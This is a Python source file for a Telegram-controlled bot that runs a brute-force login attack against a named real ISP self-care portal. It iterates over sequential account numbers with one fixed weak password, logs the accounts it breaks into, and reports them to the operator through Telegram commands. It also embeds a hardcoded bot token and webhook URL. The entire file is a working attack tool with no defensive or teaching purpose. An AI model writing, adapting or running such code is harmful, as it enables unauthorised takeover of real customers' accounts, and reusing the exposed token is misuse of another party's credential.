import asyncio
import logging
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, Response, abort
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from asgiref.wsgi import WsgiToAsgi
import uvicorn

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Flask app
app = Flask(__name__)

# Telegram bot token
TOKEN = '7127811523:AAGp8Ow2XkoFEqpszsMH8nzYw72lsQXhkfU'

# Set the URL of the login form
base_url = "https://selfcare.carnival.com.bd"
url = base_url + "/login.php"

# Set the password to try
password = "12345678"

# Initialize the username counter
username = 100233

# Create the Telegram Application
application = ApplicationBuilder().token(TOKEN).build()

# Function to perform the brute force attack
async def brute_force_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global username
    while True:
        logging.info(f"Trying username {username}...")
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Trying username {username}...")
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        form = soup.find('form', {'class': 'login'})
        action = form['action']
        data = {
            'username': str(username),
            'password': password
        }
        response = requests.post(base_url + action, data=data)
        soup = BeautifulSoup(response.content, 'html.parser')
        if soup.find('title').text == 'Carnival::Selfcare Dashboard':
            logging.info(f"Login successful with username {username} and password {password}")
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Login successful with username {username} and password {password}")
            with open("logged_in_ids.txt", "a") as f:
                f.write(f"{username}\n")
        else:
            logging.info(f"Failed to login with username {username} and password {password}")
        username += 1
        await asyncio.sleep(1)  # Add a delay to avoid overwhelming the server

# Telegram bot handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logging.info(f"Received /start command from {update.effective_user.username}")
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Brute force attack started!")
    asyncio.create_task(brute_force_attack(update, context))

async def show_logged_in(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logging.info(f"Received /show_logged_in command from {update.effective_user.username}")
    try:
        with open("logged_in_ids.txt", "r") as f:
            logged_in_ids = f.readlines()
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Logged in IDs:\n" + "\n".join(logged_in_ids))
    except FileNotFoundError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="No logged in IDs yet.")

async def which(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logging.info(f"Received /which command from {update.effective_user.username}")
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Trying username {username}...")

application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("show_logged_in", show_logged_in))
application.add_handler(CommandHandler("which", which))

@app.route(f'/{TOKEN}', methods=['POST'])
async def webhook() -> Response:
    """Handle incoming Telegram updates"""
    update = Update.de_json(request.get_json(force=True), application.bot)
    await application.update_queue.put(update)
    return Response(status=200)

@app.route(f'/{TOKEN}', methods=['GET'])
def healthcheck() -> Response:
    """Healthcheck endpoint"""
    return "Webhook is set!", 200

async def main() -> None:
    # Set webhook
    await application.bot.set_webhook(url=f'https://letmesee.onrender.com/{TOKEN}')

    # Set up webserver
    config = uvicorn.Config(
        app=WsgiToAsgi(app),
        port=10000,
        host="0.0.0.0",
        log_level="info"
    )
    webserver = uvicorn.Server(config)

    # Run application and webserver together
    async with application:
        await application.start()
        await webserver.serve()
        await application.stop()

if __name__ == '__main__':
    asyncio.run(main())
